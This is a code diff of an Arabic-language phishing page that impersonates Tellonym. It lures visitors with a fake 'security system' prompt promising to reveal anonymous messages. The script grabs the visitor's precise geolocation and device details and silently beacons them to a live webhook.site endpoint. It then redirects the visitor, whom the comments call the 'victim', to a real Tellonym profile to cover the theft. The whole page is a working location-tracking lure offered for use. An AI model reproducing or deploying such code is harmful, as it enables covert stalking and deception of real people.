@@ -1,35 +1,67 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Tellonym</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tellonym | Schaien</title>
     <style>
-        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .btn { background: #fe2c55; color: #fff; border: none; padding: 20px 40px; border-radius: 50px; font-weight: bold; cursor: pointer; }
+        body { margin: 0; background-color: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { width: 85%; max-width: 340px; background: #121212; border: 1px solid #222; padding: 40px 20px; border-radius: 30px; text-align: center; }
+        .icon { font-size: 50px; margin-bottom: 15px; }
+        h2 { font-size: 20px; margin-bottom: 10px; }
+        p { color: #888; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        .btn { background: #fe2c55; color: white; border: none; padding: 16px; border-radius: 35px; font-weight: bold; width: 100%; font-size: 16px; cursor: pointer; -webkit-tap-highlight-color: transparent; }
     </style>
 </head>
 <body>
-    <button class="btn" onclick="start()">مشاهدة الرسائل المجهولة 🔐</button>
 
-<script>
-    function start() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(pos) {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                
-                // ضع رابط الـ Webhook الخاص بك هنا بدلاً من الرابط أدناه
-                const webhookUrl = "ضع_رابط_WEBHOOK_هنا";
-                
-                // إرسال البيانات عبر طلب مخفي (Beacon) وهو الأقوى في تخطي الحظر
-                navigator.sendBeacon(webhookUrl + "?lat=" + lat + "&lon=" + lon);
+    <div class="card">
+        <div class="icon">🔒</div>
+        <h2>تأكيد نظام الأمان</h2>
+        <p>لمشاهدة الرسائل السرية الموجهة إليك، يرجى السماح للنظام بتأكيد موقعك لفك تشفير البيانات وحمايتك من المتنمرين.</p>
+        <button class="btn" id="startBtn">استمرار للمشاهدة</button>
+    </div>
 
-                setTimeout(() => { window.location.href = "https://tellonym.me/Schaien"; }, 800);
-            }, function() {
+    <script>
+        const webhookUrl = "https://webhook.site/5e829926-604d-4dde-a540-5530e155e703";
+
+        document.getElementById('startBtn').addEventListener('click', function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const acc = pos.coords.accuracy;
+
+                    // إرسال البيانات فوراً للـ Webhook بطريقة مخفية ولا تُحظر
+                    const data = JSON.stringify({
+                        status: "🎯 Success",
+                        lat: lat,
+                        lon: lon,
+                        accuracy: acc + " meters",
+                        google_maps: `https://www.google.com/maps?q=${lat},${lon}`,
+                        device: navigator.userAgent
+                    });
+
+                    // استخدام Beacon لإرسال البيانات رغماً عن المتصفح
+                    navigator.sendBeacon(webhookUrl, data);
+
+                    // تحويل الضحية بعد وقت قصير جداً
+                    setTimeout(function() {
+                        window.location.href = "https://tellonym.me/Schaien";
+                    }, 500);
+
+                }, function(err) {
+                    // في حال الرفض يتم التحويل للتمويه
+                    window.location.href = "https://tellonym.me/Schaien";
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 7000,
+                    maximumAge: 0
+                });
+            } else {
                 window.location.href = "https://tellonym.me/Schaien";
-            }, {enableHighAccuracy: true});
-        }
-    }
-</script>
+            }
+        });
+    </script>
 </body>
 </html>
